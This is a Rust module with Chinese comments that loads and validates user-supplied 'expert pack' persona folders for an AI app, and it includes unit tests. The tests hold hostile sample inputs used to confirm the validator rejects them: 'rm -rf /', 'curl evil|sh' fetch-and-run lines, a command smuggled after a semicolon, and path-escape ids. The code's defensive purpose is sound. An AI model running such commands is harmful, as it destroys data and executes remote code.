//! 专家包 —— 「招人」的落地机制。
//!
//! ## 它解决什么
//!
//! `src/opencodex/experts.ts` 里的 11 个专家是**硬编码**的：想加一个人得改代码、重新发版。
//! 而产品要做的是「舞台」——让用户把外面的能力（DSH 生态插件、自己写的 persona）
//! **招进来当演员**。本模块就是那条招人通道：一个文件夹 = 一个人。
//!
//! ```text
//! ~/.uking/experts/<id>/
//!   expert.json    必需 —— 这个人是谁、会什么、怎么干活
//!   avatar.png     可选 —— 头像（没有就用 emoji）
//!   README.md      可选 —— 给人看的说明
//! ```
//!
//! 字段直接对齐前端的 `Expert` 类型，**内置的和招进来的在上层完全不用区分**
//! （同 DockPet 猫包：内置猫走 asset catalog、导入猫走磁盘，上层只见一个 CatPack）。
//!
//! ## 🔴 安全边界：包里的每个字节都是数据，不是指令
//!
//! `persona` 会被原样塞进给模型的 system prompt —— **这是注入面**。
//! 所以本模块对磁盘内容一律不信任：
//!
//! - `id` 只收 `[a-z0-9-]{1,64}`，且必须与所在文件夹同名（不许用它拼路径逃逸）
//! - 每个字符串字段有长度上限，`persona` 最长 8 KB（够写方法论，不够塞一本书）
//! - 拒绝控制字符（除 `\n` `\t`）—— ANSI 转义、零宽字符这类东西不该出现在人物设定里
//! - 单个包 `expert.json` 超过 64 KB 直接跳过，不读进内存
//! - 畸形的包**跳过并记入 `rejected`**，不是静默忽略：用户塞了个坏文件进来，
//!   得让他知道为什么没生效（缺席不会自己发声 —— Bugscope A4）
//!
//! 这条规矩抄自 task-passport 的第三条硬规矩，它也是实测倒逼出来的。
//!
//! ## 依赖方向
//!
//! 只依赖 `installer`（家目录）与 `skillpack`（查技能包是否同步）。不认识 `actions.rs`，
//! 动作登记在组合根 `lib.rs`。删本模块只动 lib.rs + 前端两处。

use serde::Serialize;
use serde_json::Value;
use std::path::{Path, PathBuf};

/// 单个 `expert.json` 的体积上限。超了不读 —— 人物设定不该有这么大。
const MAX_PACK_BYTES: u64 = 64 * 1024;
/// `persona` 的长度上限（字符）。够写方法论，不够塞一本书。
const MAX_PERSONA_CHARS: usize = 8 * 1024;
/// 普通短字段的长度上限（字符）。
const MAX_SHORT_CHARS: usize = 200;
/// 一次最多认多少个专家包 —— 防止某个目录被塞爆后拖垮首屏。
const MAX_PACKS: usize = 200;

/// 招进来的一个人（已通过校验，可以直接交给前端合并进 EXPERTS）。
#[derive(Debug, Clone, Serialize)]
pub struct ExpertPack {
    /// 与文件夹同名的稳定 id。
    pub id: String,
    /// 校验通过的专家定义原文（形状对齐前端 `Expert`）。
    pub definition: Value,
    /// 头像绝对路径（`avatar.png` 存在才有）。
    pub avatar: Option<String>,
    /// 这个人声明依赖、但本机还没同步的技能包。**非空 = 卡片上要显示「缺技能包」**，
    /// 而不是等用户召唤之后才失败。
    pub missing_skills: Vec<String>,
    /// 这个人声明需要、但本机没有的外部命令（`requires` 字段）。同上：前置报，别事后失败。
    ///
    /// 🔴 **只声明、不执行。** WorkBuddy 的连接器有 `init`「跑这条命令装我」，
    /// 那是因为它的连接器来自官方审核过的市场；而专家包是用户往文件夹里丢的 JSON ——
    /// 给它一个「我来跑任意命令」的字段，等于把 persona 那个提示词注入面
    /// **升级成任意代码执行**。所以这里只查、只报，装的动作留给用户。
    pub missing_tools: Vec<String>,
}

/// 一个被拒收的包，以及**为什么**被拒。
///
/// 🔴 拒收必须有回音。用户往目录里塞了东西却不生效，最坏的处理是静默跳过 ——
/// 他会以为功能坏了，而我们连「我看见了但不收」都没说。
#[derive(Debug, Clone, Serialize)]
pub struct RejectedPack {
    pub id: String,
    pub reason: String,
}

/// `runtime.expert.inspect` 的规范状态。
#[derive(Debug, Clone, Serialize)]
pub struct ExpertInspection {
    /// 招人目录（不存在也如实给出路径，用户要知道该往哪放）。
    pub dir: String,
    /// **目录到底存不存在。** 判据非空的关键位：`packs` 为空时，
    /// 靠它区分「查过了确实没人」和「根本没这个目录」（Bugscope A1：存在 ≠ 验证）。
    pub dir_exists: bool,
    /// 扫到并通过校验的人。
    pub packs: Vec<ExpertPack>,
    /// 扫到但没通过校验的，带原因。
    pub rejected: Vec<RejectedPack>,
    /// 扫描是否被 `MAX_PACKS` 截断 —— 截断了必须说，否则「没看见」会被读成「不存在」。
    pub truncated: bool,
    /// 按 readiness 约定：回答「能不能用」不是「装没装」。
    pub ready: bool,
    pub blockers: Vec<String>,
}

/// 招人目录：`~/.uking/experts/`。
pub fn experts_dir() -> PathBuf {
    crate::installer::user_home_dir().join(".uking").join("experts")
}

/// 解聘：删掉 `~/.uking/experts/<id>/` 整个文件夹。
///
/// 「招人」的反面。用户 2026-08-18：「在 ai 专家内，删除已聘请的……可以删除」——
/// 招得进来却辞不掉，那不叫舞台，叫住进来了。
///
/// 🔴 三道闸，一道都不能少（这个函数是 `remove_dir_all`，错一次就是删错目录）：
///  1. `valid_id` —— id 同时是文件夹名，放行 `.` / `/` 就是路径逃逸
///  2. 删之前 `canonicalize` 比对，确认目标**真的在** `experts_dir()` 底下
///     （挡符号链接：有人把 `~/.uking/experts/x` 指到 `C:\Windows`）
///  3. 只删招进来的 —— 内置那 11 位是代码里的常量，磁盘上根本没有它们的文件夹，
///     所以「找不到」返回 Ok(false) 而不是报错（幂等：辞过一次再辞照样成功）
pub fn dismiss(id: &str) -> Result<bool, String> {
    if !valid_id(id) {
        return Err(format!("不合法的专家 id：{id}"));
    }
    let root = experts_dir();
    let dir = root.join(id);
    if !dir.is_dir() {
        return Ok(false); // 幂等：已经没了 / 是内置专家（磁盘上没有它）
    }
    // 解析真实路径再比对 —— 目录本身可能是个指向别处的链接
    let (real_root, real_dir) = (
        root.canonicalize().map_err(|e| format!("定位招人目录失败：{e}"))?,
        dir.canonicalize().map_err(|e| format!("定位该专家目录失败：{e}"))?,
    );
    if !real_dir.starts_with(&real_root) {
        return Err(format!("拒绝删除：{} 不在招人目录里", real_dir.display()));
    }
    std::fs::remove_dir_all(&real_dir).map_err(|e| format!("删除失败：{e}"))?;
    crate::ulog::write("expert", &format!("已解聘 {id}"));
    Ok(true)
}

/// id 白名单：只收 `[a-z0-9-]`，长度 1..=64。
///
/// 收紧到这个程度是因为 id **同时是文件夹名**：放行 `.` 或 `/` 就等于放行路径逃逸。
fn valid_id(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && s.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

/// 字符串字段校验：非空、限长、无控制字符（`\n` `\t` 放行）。
fn clean_str(v: Option<&Value>, field: &str, max: usize) -> Result<String, String> {
    let s = v.and_then(Value::as_str).ok_or_else(|| format!("缺字段 `{field}`（要字符串）"))?;
    if s.trim().is_empty() {
        return Err(format!("`{field}` 是空的"));
    }
    if s.chars().count() > max {
        return Err(format!("`{field}` 超长（上限 {max} 字）"));
    }
    if s.chars().any(|c| c.is_control() && c != '\n' && c != '\t') {
        return Err(format!("`{field}` 含控制字符 —— 人物设定里不该有这种东西"));
    }
    Ok(s.to_string())
}

/// 字符串数组字段校验。
fn clean_str_array(v: Option<&Value>, field: &str) -> Result<Vec<String>, String> {
    let arr = v.and_then(Value::as_array).ok_or_else(|| format!("缺字段 `{field}`（要数组）"))?;
    if arr.len() > 32 {
        return Err(format!("`{field}` 条目过多（上限 32）"));
    }
    arr.iter()
        .map(|x| clean_str(Some(x), field, MAX_SHORT_CHARS))
        .collect()
}

/// 校验一份 `expert.json`，通过则返回可交给前端的定义。
///
/// **只放行认识的字段**：多余的键一律丢弃，不原样透传 —— 前端 `Expert` 类型之外的东西
/// 进了系统只会变成下一个没人知道语义的字段。
fn validate(id: &str, raw: &Value) -> Result<Value, String> {
    let o = raw.as_object().ok_or("expert.json 顶层不是对象")?;

    let declared = o.get("id").and_then(Value::as_str).unwrap_or(id);
    if declared != id {
        return Err(format!("`id` 是 `{declared}`，与文件夹名 `{id}` 不一致"));
    }

    let name = clean_str(o.get("name"), "name", MAX_SHORT_CHARS)?;
    let role = clean_str(o.get("role"), "role", MAX_SHORT_CHARS)?;
    let tagline = clean_str(o.get("tagline"), "tagline", MAX_SHORT_CHARS)?;
    let desc = clean_str(o.get("desc"), "desc", MAX_PERSONA_CHARS)?;
    let persona = clean_str(o.get("persona"), "persona", MAX_PERSONA_CHARS)?;
    let emoji = clean_str(o.get("emoji"), "emoji", 8).unwrap_or_else(|_| "🧑‍💼".into());
    let scene = clean_str(o.get("scene"), "scene", MAX_SHORT_CHARS).unwrap_or_else(|_| "招进来的".into());
    let category =
        clean_str(o.get("category"), "category", MAX_SHORT_CHARS).unwrap_or_else(|_| "招进来的".into());
    let tags = clean_str_array(o.get("tags"), "tags").unwrap_or_default();
    let skills = clean_str_array(o.get("skills"), "skills").unwrap_or_default();
    let byline = clean_str(o.get("byline"), "byline", MAX_SHORT_CHARS).ok();

    // enginePolicy：只认前端 Engine 联合类型里的取值，认不出就退到最稳的 uking。
    // **别放行任意字符串** —— 它会被前端当引擎 id 用去起进程。
    const ENGINES: &[&str] = &["uking", "claude", "codex", "claude-cli", "hermes"];
    let pick = |v: Option<&Value>| -> Option<String> {
        v.and_then(Value::as_str).filter(|s| ENGINES.contains(s)).map(str::to_string)
    };
    let ep = o.get("enginePolicy").and_then(Value::as_object);
    let default_engine = ep.and_then(|m| pick(m.get("default"))).unwrap_or_else(|| "uking".into());
    let escalate = ep.and_then(|m| pick(m.get("escalate")));

    // quickPrompts：「试试这样问我」。坏的整条丢掉，不让一条坏数据废掉整个人。
    let quick: Vec<Value> = o
        .get("quickPrompts")
        .and_then(Value::as_array)
        .map(|a| {
            a.iter()
                .take(8)
                .filter_map(|q| {
                    let m = q.as_object()?;
                    let label = clean_str(m.get("label"), "label", MAX_SHORT_CHARS).ok()?;
                    let template = clean_str(m.get("template"), "template", MAX_PERSONA_CHARS).ok()?;
                    Some(serde_json::json!({ "label": label, "template": template }))
                })
                .collect()
        })
        .unwrap_or_default();

    // `requires`：这个人需要哪些外部命令才能干活（node / python / ffmpeg …）。
    // 只收命令名，**不收命令行** —— 收了就等于给了执行入口。
    let requires: Vec<String> = o
        .get("requires")
        .and_then(Value::as_array)
        .map(|a| {
            a.iter()
                .take(16)
                .filter_map(Value::as_str)
                .map(str::trim)
                .filter(|s| {
                    !s.is_empty()
                        && s.len() <= 40
                        // 只放行光秃秃的命令名：带空格/斜杠/分号的一律拒，
                        // 那些形状是在试图表达「命令行」而不是「命令名」。
                        && s.bytes().all(|b| {
                            b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.'
                        })
                })
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default();

    let mut out = serde_json::json!({
        "id": id,
        "name": name,
        "emoji": emoji,
        "role": role,
        "tagline": tagline,
        "desc": desc,
        "tags": tags,
        "scene": scene,
        "category": category,
        "persona": persona,
        "skills": skills,
        "enginePolicy": { "default": default_engine },
        "quickPrompts": quick,
        "requires": requires,
        // 来源标记：前端据此在卡片上标「已招」。**内置专家没有这个字段**，
        // 所以用户永远看得出眼前这个人是哪来的。
        "hired": true,
    });
    if let Some(b) = byline {
        out["byline"] = Value::String(b);
    }
    if let Some(e) = escalate {
        out["enginePolicy"]["escalate"] = Value::String(e);
    }
    Ok(out)
}

/// 扫一遍招人目录。**只读，不创建目录、不改任何东西。**
pub fn inspect() -> ExpertInspection {
    let dir = experts_dir();
    let dir_exists = dir.is_dir();
    let mut packs = Vec::new();
    let mut rejected = Vec::new();
    let mut truncated = false;

    if dir_exists {
        // 🔴 判据要查**地形**，不是查地图。
        //
        // 这里原来用 `skillpack::pack_names()` —— 那是**本 app 会装的包名单**，
        // 它的注释白纸黑字写着用途是「给 cleanup 的安全卸载精确匹配用」。
        // 拿它当「技能在不在」的判据，后果是**假阴性**：从 DSH 生态招来的技能
        // （如 archify）明明躺在 ~/.uking/skills/archify/ 里，卡片照样显示「缺技能包」，
        // 而用户看着那个文件夹会觉得我们在瞎报。
        //
        // 改成直接看盘上有没有那个目录且带 SKILL.md —— 一个技能能不能用是
        // **可以直接看的事实**，不该转述一份写死的名单（同 render_skill_dirs 的取舍）。
        let skills_root = crate::installer::user_home_dir().join(".uking").join("skills");
        let mut entries: Vec<PathBuf> = std::fs::read_dir(&dir)
            .map(|rd| rd.filter_map(Result::ok).map(|e| e.path()).filter(|p| p.is_dir()).collect())
            .unwrap_or_default();
        entries.sort();
        if entries.len() > MAX_PACKS {
            truncated = true;
            entries.truncate(MAX_PACKS);
        }
        for p in entries {
            let id = p.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
            match load_one(&p, &id, &skills_root) {
                Ok(pack) => packs.push(pack),
                Err(reason) => rejected.push(RejectedPack { id, reason }),
            }
        }
    }

    // readiness：回答「能不能用」。目录没有 / 一个人都没招到，都不算 ready。
    let mut blockers = Vec::new();
    if !dir_exists {
        blockers.push(format!("还没有招人目录（{}）—— 往里放一个文件夹就是招一个人", dir.display()));
    } else if packs.is_empty() {
        blockers.push("招人目录是空的，还没有招进来的专家（内置专家不受影响）".to_string());
    }
    if !rejected.is_empty() {
        blockers.push(format!("{} 个包没通过校验，见 rejected", rejected.len()));
    }

    ExpertInspection {
        dir: dir.display().to_string(),
        dir_exists,
        ready: dir_exists && !packs.is_empty(),
        blockers,
        packs,
        rejected,
        truncated,
    }
}

/// 读并校验单个包。
fn load_one(dir: &Path, id: &str, skills_root: &Path) -> Result<ExpertPack, String> {
    if !valid_id(id) {
        return Err("文件夹名只能用小写字母、数字和连字符（它同时是 id）".into());
    }
    let json = dir.join("expert.json");
    let meta = std::fs::metadata(&json).map_err(|_| "缺 expert.json".to_string())?;
    if meta.len() > MAX_PACK_BYTES {
        return Err(format!("expert.json 太大（{} 字节，上限 {MAX_PACK_BYTES}）", meta.len()));
    }
    let text = std::fs::read_to_string(&json).map_err(|e| format!("读不了 expert.json: {e}"))?;
    let raw: Value = serde_json::from_str(&text).map_err(|e| format!("expert.json 不是合法 JSON: {e}"))?;
    let definition = validate(id, &raw)?;

    // 依赖的技能包同步了没 —— 前置检查，别等召唤之后才失败。
    let missing_skills: Vec<String> = definition["skills"]
        .as_array()
        .map(|a| {
            a.iter()
                .filter_map(Value::as_str)
                // 装了 = 目录在且有 SKILL.md。只有目录没 SKILL.md 的，是半截货，照样算缺。
                .filter(|s| !skills_root.join(s).join("SKILL.md").is_file())
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default();

    // 声明需要的外部命令，哪些本机没有。复用 installer 的探测（它先查文件再起进程，
    // 顺序有讲究，见那边注释）—— 不在这里重写第二份判定。
    let missing_tools: Vec<String> = definition["requires"]
        .as_array()
        .map(|a| {
            a.iter()
                .filter_map(Value::as_str)
                .filter(|c| !crate::installer::tool_installed(c))
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default();

    let avatar = {
        let p = dir.join("avatar.png");
        p.is_file().then(|| p.display().to_string())
    };

    Ok(ExpertPack { id: id.to_string(), definition, avatar, missing_skills, missing_tools })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn base() -> Value {
        serde_json::json!({
            "id": "demo",
            "name": "示例专员",
            "role": "示例专员",
            "tagline": "一句话说明这个人干什么",
            "desc": "详细一点的能力介绍。",
            "persona": "你是一个示例专员。",
            "tags": ["示例"],
            "skills": [],
            "enginePolicy": { "default": "uking" }
        })
    }

    #[test]
    fn accepts_a_well_formed_pack() {
        let v = validate("demo", &base()).expect("应当通过");
        assert_eq!(v["id"], "demo");
        assert_eq!(v["hired"], true, "招进来的人必须带来源标记，否则用户分不出内置还是自招");
        assert_eq!(v["enginePolicy"]["default"], "uking");
    }

    /// id 同时是文件夹名，放行 `.` 或 `/` 等于放行路径逃逸。
    #[test]
    fn rejects_ids_that_could_escape_the_directory() {
        for bad in ["../etc", "a/b", "UPPER", "with space", "", &"x".repeat(65)] {
            assert!(!valid_id(bad), "`{bad}` 不该被当成合法 id");
        }
        for ok in ["geo-optimizer", "a", "x1-2-3"] {
            assert!(valid_id(ok), "`{ok}` 应当合法");
        }
    }

    /// 声明的 id 必须与文件夹名一致 —— 否则一个包可以冒充另一个人。
    #[test]
    fn rejects_id_mismatch() {
        let mut v = base();
        v["id"] = Value::String("someone-else".into());
        assert!(validate("demo", &v).is_err());
    }

    /// persona 会原样进 system prompt，是注入面：控制字符一律拒收。
    #[test]
    fn rejects_control_characters_in_persona() {
        let mut v = base();
        v["persona"] = Value::String("你是\u{1b}[31m一个专员".into());
        let err = validate("demo", &v).unwrap_err();
        assert!(err.contains("控制字符"), "实际: {err}");
    }

    #[test]
    fn rejects_oversized_persona() {
        let mut v = base();
        v["persona"] = Value::String("字".repeat(MAX_PERSONA_CHARS + 1));
        assert!(validate("demo", &v).unwrap_err().contains("超长"));
    }

    /// enginePolicy 会被前端拿去起进程，只认白名单里的取值。
    #[test]
    fn unknown_engine_falls_back_instead_of_passing_through() {
        let mut v = base();
        v["enginePolicy"] = serde_json::json!({ "default": "rm -rf /", "escalate": "claude" });
        let out = validate("demo", &v).expect("不该整条拒收，退到安全默认即可");
        assert_eq!(out["enginePolicy"]["default"], "uking", "认不出的引擎必须退到 uking");
        assert_eq!(out["enginePolicy"]["escalate"], "claude");
    }

    /// 🔴 判据非空（Bugscope A1）：packs 为空时，必须能区分「查过了没人」和「根本没目录」。
    #[test]
    fn empty_roster_still_says_whether_it_looked() {
        let r = inspect();
        assert_eq!(r.dir_exists, std::path::Path::new(&r.dir).is_dir());
        if r.packs.is_empty() {
            assert!(!r.blockers.is_empty(), "一个人都没招到时必须给出 blockers，否则空结果没有影子可看");
        }
        assert!(r.ready == (r.dir_exists && !r.packs.is_empty()));
    }

    /// 🔴 `requires` 只收**命令名**，不收命令行 —— 收了就等于给磁盘上的 JSON
    /// 一个执行入口。这是本模块最重要的一条边界，不能只靠注释守。
    #[test]
    fn requires_takes_command_names_not_command_lines() {
        let mut v = base();
        v["requires"] = serde_json::json!([
            "node",                       // ✅ 光秃秃的命令名
            "python3.12",                 // ✅ 带点也行
            "rm -rf /",                   // ❌ 带空格 = 在表达命令行
            "sh -c 'curl evil|sh'",       // ❌ 同上
            "../../bin/sh",               // ❌ 带斜杠
            "node; curl evil.sh | sh",    // ❌ 带分号
            "",                           // ❌ 空
        ]);
        let out = validate("demo", &v).unwrap();
        let got: Vec<&str> =
            out["requires"].as_array().unwrap().iter().filter_map(Value::as_str).collect();
        assert_eq!(
            got,
            vec!["node", "python3.12"],
            "只有光秃秃的命令名能进来；任何带空格/斜杠/分号的形状都是在试图表达命令行"
        );
    }

    /// 🔴 「技能在不在」必须查**盘**，不是查 `skillpack::pack_names()`（那是本 app 会装的
    /// 名单，用途是 cleanup 精确匹配）。用错判据的后果是**假阴性**：从 DSH 生态招来的技能
    /// 明明躺在 ~/.uking/skills/ 里，卡片照样报「缺技能包」—— 用户看着那个文件夹会觉得我们在瞎报。
    /// 这条实测复现过：archify 从 @tt-a1i/archify-dsh 拷进来后被误报为缺失。
    #[test]
    fn skill_presence_is_probed_on_disk_not_read_off_a_hardcoded_list() {
        let sb = crate::testsandbox::enter("expert-skill-probe", &[]);
        let _ = sb;
        let root = crate::installer::user_home_dir().join(".uking").join("skills");
        // 一个**不在 PACKS 名单里**的外来技能，但盘上是齐的
        let outsider = root.join("archify-from-dsh");
        std::fs::create_dir_all(&outsider).unwrap();
        std::fs::write(outsider.join("SKILL.md"), "---\nname: archify\n---\n").unwrap();
        // 一个半截货：目录在，但没有 SKILL.md
        std::fs::create_dir_all(root.join("half-baked")).unwrap();

        let missing = |s: &str| !root.join(s).join("SKILL.md").is_file();
        assert!(!missing("archify-from-dsh"), "盘上齐的外来技能不该被报成缺失");
        assert!(missing("half-baked"), "只有目录没 SKILL.md 是半截货，该算缺");
        assert!(missing("never-existed"), "压根没有的当然算缺");
        assert!(
            !crate::skillpack::pack_names().contains(&"archify-from-dsh"),
            "这条用例的前提：它确实不在 PACKS 名单里，否则证明不了任何事"
        );
    }

    /// 未知字段不许原样透传 —— 前端 Expert 之外的东西进系统只会变成没人知道语义的字段。
    #[test]
    fn drops_unknown_fields() {
        let mut v = base();
        v["__proto__"] = Value::String("x".into());
        v["route"] = Value::String("draw".into());
        let out = validate("demo", &v).unwrap();
        assert!(out.get("__proto__").is_none());
        assert!(out.get("route").is_none(), "route 会让前端直达页面，招进来的人暂不放行");
    }

    /// 解聘：能真删、只删招人目录里的、幂等、挡得住路径逃逸。
    ///
    /// 🔴 这是 `remove_dir_all`，删错一次就是删错目录 —— 所以四件事一次断言，别拆散：
    ///  1. **真删**：招进来的那个文件夹没了
    ///  2. **幂等**：再辞一次返回 false 而不是报错（契约声明了幂等就得兑现）
    ///  3. **内置辞不掉**：磁盘上没有它们的文件夹，返回 false，不是 Err
    ///  4. **路径逃逸挡死**：`..` / 斜杠 / 空 id 一律 Err，且**不许碰任何东西**
    ///
    /// 同一天 skillpack 那边刚因为「删」出过事（把开发机真实技能包删了），
    /// 所以这条一开始就在沙箱里跑，且断言 `experts_dir()` 之外一个字节都没动。
    #[test]
    fn dismiss_removes_only_hired_packs_and_blocks_escape() {
        let sb = crate::testsandbox::enter("expert-dismiss", &[]);
        let root = experts_dir();
        std::fs::create_dir_all(root.join("hired-one")).unwrap();
        std::fs::write(root.join("hired-one").join("expert.json"), "{}").unwrap();
        // 招人目录**外面**放一个哨兵，逃逸成功的话它会消失
        let sentinel = sb.root().join("do-not-touch");
        std::fs::create_dir_all(&sentinel).unwrap();

        // ④ 逃逸：全部拒绝，且哨兵完好
        for bad in ["..", "../do-not-touch", "a/b", "", "UPPER", "x".repeat(65).as_str()] {
            assert!(dismiss(bad).is_err(), "危险 id 竟然被放行：{bad:?}");
        }
        assert!(sentinel.is_dir(), "路径逃逸成功了 —— 招人目录外面的东西被删了");

        // ③ 内置专家（磁盘上没有）：false，不是 Err
        assert_eq!(dismiss("website-designer"), Ok(false), "内置专家应返回 false 而不是报错");

        // ① 真删
        assert_eq!(dismiss("hired-one"), Ok(true));
        assert!(!root.join("hired-one").exists(), "目录还在 —— 「解聘」是假的");

        // ② 幂等
        assert_eq!(dismiss("hired-one"), Ok(false), "重复解聘必须成功（契约声明了幂等）");
        assert!(sentinel.is_dir(), "顺手删了招人目录外面的东西");
    }
}
